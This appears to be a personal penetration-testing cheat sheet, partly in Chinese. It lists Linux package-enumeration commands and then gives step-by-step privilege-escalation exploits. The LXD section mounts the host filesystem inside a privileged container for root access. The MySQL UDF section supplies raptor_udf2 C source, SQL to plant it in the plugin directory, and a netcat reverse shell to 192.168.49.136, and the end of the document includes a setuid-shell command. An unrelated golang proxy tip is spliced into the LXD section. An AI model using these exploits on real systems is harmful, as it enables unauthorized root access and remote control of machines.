## Debian:

```bash
dpkg -l

ls -alh /usr/bin/
ls -alh /sbin/
ls -alh /var/cache/apt/archivesO
ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -
```

## RedHat:

```sh
rpm -qa
ls -alh /var/cache/yum/
```


## BSD:

```sh
pkg_info
```

## Gentoo:
 ```sh
equery list 
- eix -I
```

## Arch Linux:

```sh
pacman -Q
```


## Bash Script:

```
#!/bin/bash
IFS=: read -ra dirs_in_path <<< "$PATH"

for dir in "${dirs_in_path[@]}"; do
    for file in "$dir"/*; do
        [[ -x $file && -f $file ]] && printf '%s\n' "${file##*/}"
    done
done
```

# Exploit
## LXD PrivEsc
LXD 是一个管理 API，用于处理 Linux 系统上的 LXC 容器。它将为本地 lxd 组的任何成员执行任务。它不会将调用用户的权限与要求其执行的函数进行匹配
#### Container Tech
将一个程序运行的过程进行打包


### LXD Vulnerable
#### Env
```bash
sudo apt install lxd #安装lxd
apt install zfsutils-linux #安装依赖包
usermod --append --groups lxd raj #添加用户到用户组(lxd)

lxd init #搭建容器
lxc launch ubuntu:18.04 #容器环境
lxc list #展示容器
lxc exec intimate-seasnail -- /bin/bash #容器中使用命令
```

#### Exploit
下载一个轻量级的linux发行版，利用`lxc import`到远程系统(root)上，在`/mnt/root`中实现提权的反弹shell
#Tips golang翻墙安装插件修改（国产特情
```bash
conda activate mybios   #激活自己额conda环境
conda install -c conda-forge go #安装go语言
go env #显示go环境变量
go env -w GO111MODULE=on #设置变量
go env -w GOPROXY=https://goproxy.cn,direct  #设置变量
go env #检查变量设置生效
```

```bash
# got a user in group(lxd)
git clone  https://github.com/saghul/lxd-alpine-builder.git 
cd lxd-alpine-builder 
./build-alpine #下载并bulid alpine镜像包-轻量级linux发行版
python3 -m http.server {LPORT}

#Remote machine
cd /tmp
wget http://{LHOST}:{LPORT}/apline-v3.10-x86_64-20191008_1227.tar.gz
lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
lxc image list #装载镜像并查看

lxc init myimage ignite -c security.privileged=true 
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true 
lxc start ignite 
lxc exec ignite /bin/sh 
id #获取root权限
```

##### Method1, 2
1. golang -> distrobuilder -> alpine.yaml(use conf to build image) -> upload and mount
```bash
sudo su
#Install requirements
sudo apt update
sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
git clone https://github.com/lxc/distrobuilder
#Make distrobuilder
cd distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container,3.8版本太老，可以使用3.9
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8
#或者，build完镜像，就可以上传了
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8 -o source.same_as=3.12
"""python3 -m http.server {LHOST}:{LOPORT}, wget tar.gz && squashfs"""
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image,镜像准备

lxc init alpine privesc -c security.privileged=true #安装镜像，并设置权限
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true #配置镜像，之后的挂载位置设置再/mnt中

lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```

2. lxd-alpine-builder(image) -> upload and mount
```bash
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default 
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

## MySQL UDF PrivEsc
> mysql User Defined Functions
> 相对来说还是需要有mysql的根权限账户才可以，否则无法在插件目录或者在mysql数据库中进行建表导出文件的操作。
### UDF
UDF可以是任意语言所写，只要放入`library`即可使用。我们可以创建恶意函数，在底层操作系统上运行与正在运行的服务具有相同权限的命令。
```C
#include <stdio.h>
#include <stdlib.h>
 
enum Item_result {STRING_RESULT, REAL_RESULT, INT_RESULT, ROW_RESULT};
 
typedef struct st_udf_args {
        unsigned int arg_count; // number of arguments
        enum Item_result *arg_type; // pointer to item_result
        char **args; // pointer to arguments
        unsigned long *lengths; // length of string args
        char *maybe_null; // 1 for maybe_null args
} UDF_ARGS;
 
typedef struct st_udf_init {
        char maybe_null; // 1 if func can return NULL
        unsigned int decimals; // for real functions
        unsigned long max_length; // for string functions
        char *ptr; // free ptr for func data
        char const_item; // 0 if result is constant
} UDF_INIT;
 
int do_system(UDF_INIT *initid, UDF_ARGS *args, char *is_null, char *error) {
        if (args->arg_count != 1) {
                return(0);
        }
        system(args->args[0]);
        return(0);
}
 
char do_system_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
        return(0);
}
```
#### 编译
```bash
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
### Exploit
```mysql
#login as root
show variables like '%plugin%'; #找到UDF的文件路径
show variables like '%secure_file_priv%'; #UDF文件可否修改导入导出(empty|NULL)
use mysql; #在mysql数据库中导入恶意payload
create table foo(line blob); #放置payload的table foo
insert into foo values(load_file('/var/www/raptor_udf2.so'));
#将恶意代码文件导入到table foo中,此处需要plugin文件夹的读写权限
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
#将table foo payload放到UDF dir
create function do_system returns integer soname 'raptor_udf2.so';
#利用该文件，创建UDF

select * from mysql.func; #确认函数已经导入
select do_system('id > /var/www/output; chown www-data www-data /var/www/output'); #开始利用
mysql> \! sh          #检查是否提权成功
\! sh
$ cat /var/www/out
cat /var/www/out
uid=0(root) gid=114(mysql) groups=114(mysql)

select do_system('nc 192.168.49.136 8080 -e /bin/bash'); #回弹shell
```

### 修改当前用户的权限
```bash
ls -la /usr/lib/lib_mysqludf_sys.so #查看sys相关的UDF
SELECT sys_exec('usermod -a -G admin john') #-a:添加组时，不移除当前组 -G:添加组
#利用moduser修改当前用户的权限

SELECT * FROM func;
use mysql;
create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
select sys exec('cp /bin/sh /tmp/shell;chown root /tmp/shell;chgrp root /tmp/shell;chmod u+s /tmp/shell');
#自行导入
